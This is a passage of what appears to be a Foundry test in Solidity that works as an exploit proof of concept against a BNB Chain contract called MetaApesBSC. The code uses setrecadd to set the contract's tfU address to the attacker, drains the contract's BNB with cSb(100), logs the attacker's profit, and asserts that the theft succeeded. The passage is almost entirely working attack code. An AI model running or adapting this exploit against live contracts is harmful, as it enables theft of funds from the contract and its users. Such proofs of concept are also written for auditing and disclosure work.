        MetaApesBSC(TARGET).setrecadd(
            currentMkwA,
            currentKrhF,
            currentMdhS,
            currentWthT,
            currentExtR,
            currentBbaK,
            attacker  // Set tfU to attacker
        );

        // Verify tfU was changed
        address newTfU = MetaApesBSC(TARGET).tfU();
        require(newTfU == attacker, "tfU not set to attacker");
        console.log("tfU successfully changed to attacker address");

        // Now drain the contract using cSb(100)
        MetaApesBSC(TARGET).cSb(100);

        vm.stopPrank();

        // Check contract balance after
        uint256 contractBalanceAfter = TARGET.balance;
        console.log("Contract BNB balance after cSb(100):", contractBalanceAfter);

        // Check attacker balance after
        uint256 finalBalance = attacker.balance;
        console.log("Final attacker balance:", finalBalance);
        console.log("Profit:", finalBalance - initialBalance);

        // Assert that attacker balance increased
        assertGt(finalBalance, initialBalance, "Attacker balance should have increased");

        // Also assert contract was drained (should be 0 or very small)
        assertLt(contractBalanceAfter, contractBalanceBefore, "Contract should have less BNB after exploit");
    }



    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

